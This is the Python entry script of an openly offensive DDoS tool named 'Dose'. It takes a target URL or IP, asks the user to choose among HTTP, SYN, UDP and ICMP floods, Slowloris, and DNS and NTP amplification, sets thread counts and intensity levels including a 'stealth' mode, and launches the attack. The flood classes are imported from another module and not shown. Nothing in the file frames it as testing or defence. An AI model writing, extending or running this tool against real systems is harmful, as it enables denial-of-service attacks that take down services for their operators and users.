#!/usr/bin/env python3

# dose/dose.py
# Main script for Dose DDoS tool with light blue aesthetic

import argparse
import sys
import time
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from colorama import init, Fore, Style
from dose.attacks import (
    HTTPFlood, SYNFlood, UDPFlood, Slowloris, ICMPFlood,
    DNSAmplification, NTPAmplification
)
from dose.utils import validate_target, get_random_user_agent

init()  # Initialize colorama
console = Console()

def print_banner():
    banner = f"""
{Fore.CYAN}██████╗  ██████╗ ███████╗███████╗
{Fore.CYAN}██╔══██╗██╔═══██╗██╔════╝██╔════╝
{Fore.CYAN}██║  ██║██║   ██║███████╗█████╗
{Fore.CYAN}██║  ██║██║   ██║╚════██║██╔══╝
{Fore.CYAN}██████╔╝╚██████╔╝███████║███████╗
{Fore.CYAN}╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{Style.RESET_ALL}
{Fore.CYAN}Dose DDoS Tool @dewon7562 - GitHub - Unleash the Ultimate Storm!{Style.RESET_ALL}
"""
    console.print(Panel(banner, style="bold cyan"))

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Dose DDoS Tool")
    parser.add_argument("target", help="Target URL or IP (e.g., http://example.com or 192.168.1.1)")
    args = parser.parse_args()

    # Validate target
    target, target_ip = validate_target(args.target)
    if not target:
        console.print("[red]Invalid target! Provide a valid URL or IP.[/red]")
        sys.exit(1)

    # Attack method selection
    console.print("[cyan]Select attack method:[/cyan]")
    console.print("1. HTTP Flood")
    console.print("2. SYN Flood")
    console.print("3. UDP Flood")
    console.print("4. Slowloris")
    console.print("5. ICMP Flood")
    console.print("6. DNS Amplification")
    console.print("7. NTP Amplification")
    attack_choice = Prompt.ask("[cyan]Enter choice (1-7)[/cyan]", choices=["1", "2", "3", "4", "5", "6", "7"], default="1")

    # Intensity selection
    console.print("[cyan]Select attack intensity:[/cyan]")
    console.print("1. Low (Stealth, fewer threads)")
    console.print("2. Medium (Balanced)")
    console.print("3. High (Maximum force)")
    intensity_choice = Prompt.ask("[cyan]Enter choice (1-3)[/cyan]", choices=["1", "2", "3"], default="2")

    # Custom threads
    threads = Prompt.ask("[cyan]Enter number of threads (default 200)[/cyan]", default="200")
    try:
        threads = int(threads)
        if threads <= 0:
            raise ValueError
    except ValueError:
        console.print("[red]Invalid thread count! Using default (200).[/red]")
        threads = 200

    # Configure attack parameters
    configs = {
        "1": {"threads": min(threads, 50), "delay": 0.1, "requests_per_thread": 100},
        "2": {"threads": min(threads, 200), "delay": 0.05, "requests_per_thread": 500},
        "3": {"threads": threads, "delay": 0.01, "requests_per_thread": 1000}
    }
    config = configs[intensity_choice]

    # Map attack methods
    attack_methods = {
        "1": HTTPFlood,
        "2": SYNFlood,
        "3": UDPFlood,
        "4": Slowloris,
        "5": ICMPFlood,
        "6": DNSAmplification,
        "7": NTPAmplification
    }
    attack_class = attack_methods[attack_choice]

    console.print(f"[cyan]Launching Dose attack on {target} with {attack_class.__name__}...[/cyan]")
    console.print(f"[cyan]Intensity: {'Low' if intensity_choice == '1' else 'Medium' if intensity_choice == '2' else 'High'}[/cyan]")
    console.print(f"[cyan]Threads: {config['threads']}[/cyan]")
    console.print("[yellow]Press Ctrl+C to stop...[/yellow]")

    # Initialize and start attack
    try:
        attack = attack_class(target, target_ip, config["threads"], config["delay"], config["requests_per_thread"])
        attack.start()
        while True:
            time.sleep(1)  # Keep script running
    except KeyboardInterrupt:
        console.print("[red]Stopping Dose attack...[/red]")
        attack.stop()
    except Exception as e:
        console.print(f"[red]Error during attack: {e}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main()
